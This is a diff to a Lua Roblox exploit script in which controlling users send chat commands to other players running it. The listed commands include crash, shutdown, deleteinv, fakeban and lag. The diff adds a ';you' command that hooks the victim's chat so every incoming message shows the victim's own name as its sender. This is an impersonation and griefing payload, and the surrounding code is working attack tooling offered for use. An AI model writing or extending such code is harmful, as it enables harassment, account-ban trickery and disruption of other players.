@@ -346,7 +346,7 @@ end
 local cmds = "⭐cmds are: reset,ac,void,kick,sit,ad,config."
 local cmds2="help,tbring,song,hev,lobby,vclipdown,butterfingers,listore,breakbow,dropheld,rageblade."
 local cmds3 = "blind,unblind,telepearl,emeraldarmor,apple,popups,deleteinv,crash,shutdown,mygame,flash"
-local cmds4 = "lava,dead,troll,byfron,fakeban,check,mute,unmute,funnymsg,ban,clearchat,lag,unlag,accban⭐"
+local cmds4 = "lava,dead,troll,byfron,fakeban,check,mute,unmute,funnymsg,ban,clearchat,lag,unlag,accban,you⭐"
 local ores = "⭐ores that can be dropped are:"
 local ores2 = "iron,diamond,emerald,gold,u can drop stuff that arnt ores too.⭐"
 
@@ -1048,6 +1048,26 @@ TextLabel.TextSize = 14.000
 TextLabel.TextWrapped = true
 wait(0.5)
 game.Players.LocalPlayer.PlayerGui.flash:Destroy()
+
+elseif cmd == ";you" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
+prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
+local textChatService = game:GetService("TextChatService")
+local sym = ":"
+local name =game.Players.LocalPlayer.Name
+textChatService.MessageReceived:Connect(function(sex)
+sex.PrefixText = ""..name..""..sym..""
+end)
+
+elseif cmd == ";you" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
+prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
+local textChatService = game:GetService("TextChatService")
+local sym = ":"
+local name =game.Players.LocalPlayer.Name
+textChatService.MessageReceived:Connect(function(sex)
+sex.PrefixText = ""..name..""..sym..""
+end)
 
 
 elseif cmd == ";troll" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
